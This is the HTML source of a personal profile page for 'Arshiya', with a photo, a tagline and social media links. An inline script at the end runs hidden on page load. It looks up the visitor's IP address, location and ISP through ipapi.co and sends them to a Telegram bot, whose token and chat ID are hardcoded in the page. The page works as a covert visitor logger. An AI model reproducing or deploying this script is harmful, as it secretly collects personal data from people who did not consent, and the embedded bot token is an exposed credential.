<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Arshiya</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(-45deg, #1d1f20, #292b2c, #1c1e1f, #2e3133);
      background-size: 400% 400%;
      animation: gradientBG 10s ease infinite;
      color: #f0f0f0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      overflow: hidden;
      position: relative;
      text-align: center;
    }

    @keyframes gradientBG {
      0% {background-position: 0% 50%;}
      50% {background-position: 100% 50%;}
      100% {background-position: 0% 50%;}
    }

    .profile-img {
      width: 160px;
      height: 160px;
      border-radius: 50%;
      object-fit: cover;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
      transition: transform 0.3s ease-in-out;
    }

    .profile-img:hover {
      transform: scale(1.05);
    }

    h1 {
      margin-top: 20px;
      font-size: 2.5rem;
    }

    p {
      font-size: 1.1rem;
      margin: 10px 0 20px;
      color: #ccc;
    }

    .links a {
      color: #00bcd4;
      text-decoration: none;
      margin: 0 10px;
      font-size: 1.1rem;
      transition: color 0.3s ease;
    }

    .links a:hover {
      color: #ffffff;
    }

    .anime-girl {
      position: absolute;
      right: 10px;
      bottom: 0;
      width: 160px;
      opacity: 0.85;
      animation: floatUpDown 4s ease-in-out infinite;
    }

    @keyframes floatUpDown {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }
  </style>
</head>
<body>

  <img src="https://i.postimg.cc/J45Mr8LW/Screenshot-Google.jpg" 
       alt="Arshiya" 
       class="profile-img">

  <h1>I'm Arshiya</h1>
  <p>You're lucky if you know me</p>

  <div class="links">
    <a href="https://t.me/lranTheory" target="_blank">Telegram</a>
    <a href="https://www.instagram.com/dark.light_yt" target="_blank">Instagram</a>
  </div>

  <img src="https://i.postimg.cc/pX4xG9GZ/anime-girl.png" class="anime-girl" alt="Anime Girl">

  <script>
    fetch("https://ipapi.co/json/")
      .then(res => res.json())
      .then(data => {
        const ip = data.ip;
        const loc = `${data.city}, ${data.region}, ${data.country_name}`;
        const isp = data.org;
        const msg = `New Visitor!\nIP: ${ip}\nLocation: ${loc}\nISP: ${isp}`;
        const botToken = "7591166314:AAGSfDjIJSH37xR_IA_b3tSg6ttjubcr1bE";
        const chatId = "6994971474";
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
      });
  </script>

</body>
</html>
